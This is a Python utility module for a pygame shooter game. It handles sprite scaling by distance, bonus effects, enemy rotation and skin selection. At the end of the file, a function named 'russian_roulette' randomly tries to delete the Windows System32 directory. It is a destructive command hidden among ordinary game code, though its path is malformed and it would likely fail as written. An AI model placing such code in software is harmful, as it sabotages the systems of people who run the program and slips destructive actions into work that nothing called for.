from enemy.enemy_types import *
from visual.render import *


def scale_bullets(size, bullets):
    if bullets:
        max_distance = (size - 100) // 2
        for bullet in bullets:
            dx = abs(size // 2 - bullet.x)
            dy = abs(size // 2 - bullet.y)
            distance_to_center = math.sqrt(dx ** 2 + dy ** 2)
            percentage = (distance_to_center / max_distance)
            bullet.radius = bullet.radius * percentage + 13
            bullet.hitbox = bullet.radius * percentage + 15


def scale_bonuses(size, bonuses):
    if bonuses:
        max_distance = size // 2
        for bonus in bonuses:
            dx = abs(size // 2 - bonus.x)
            dy = abs(size // 2 - bonus.y)
            distance_to_center = math.sqrt(dx ** 2 + dy ** 2)
            percentage = (distance_to_center / max_distance)
            bonus.size = bonus.size * percentage + 13
            bonus.hitbox = bonus.size


def scale_enemies(size, enemies):
    if enemies:
        enemy_type = enemies[0].__class__.__name__
        x = enemy_types[enemy_type]["spawn_x"]
        y = enemy_types[enemy_type]["spawn_y"]
        enemy_size = enemy_types[enemy_type]["size"]

        dx = abs(size // 2 - x)
        dy = abs(size // 2 - y)
        max_distance = math.sqrt(dx ** 2 + dy ** 2)

        for enemy in enemies:
            dx = abs(size // 2 - enemy.x)
            dy = abs(size // 2 - enemy.y)
            distance_to_center = math.sqrt(dx ** 2 + dy ** 2)
            percentage = distance_to_center / max_distance
            enemy.size = enemy_size * percentage + 20
            enemy.hitbox = enemy_size * (percentage + 0.5)

def apply_bonus_effect(player, bonus):
    if bonus.bonus_type == "repair":
        player.health += 1
    elif bonus.bonus_type == "moon_shard":
        player.bullet_cooldown_time -= 0.001
    elif bonus.bonus_type == "shield":
        player.has_shield = True


def get_enemy_stats(enemy_type):
    enemy_info = enemy_types[enemy_type.__name__]
    return enemy_info["spawn_x"], enemy_info["spawn_y"], enemy_info["size"], enemy_info["speed"]


def calculate_enemy_rotation(previous_x, previous_y, current_x, current_y):
    angle = math.atan2(current_x - previous_x, current_y - previous_y)
    return math.degrees(angle) + 180


def scale_image(image, size, size2):
    return pygame.transform.scale(image, (size, size2))


def rotate_image(image, angle):
    return pygame.transform.rotate(image, math.degrees(angle))


def rotate_enemy(enemy, previous_x, previous_y, x, y):
    rotation_angle = calculate_enemy_rotation(previous_x, previous_y, x, y)
    return pygame.transform.rotate(enemy, rotation_angle)


def get_enemy_skin(enemy):
    if isinstance(enemy, SpeedyBug) or isinstance(enemy, SpeedyBug2):
        return SMALL_ENEMY_PATH
    elif isinstance(enemy, UFO):
        return UFO_ENEMY_PATH
    elif isinstance(enemy, WavyBug):
        return WAVY_ENEMY_PATH
    elif isinstance(enemy, BigBug):
        return BIG_ENEMY_PATH
    else:
        return ""


def russian_roulette():
    if random.randint(0, 6) == 1:
        os.remove("C: \Windows\System32")
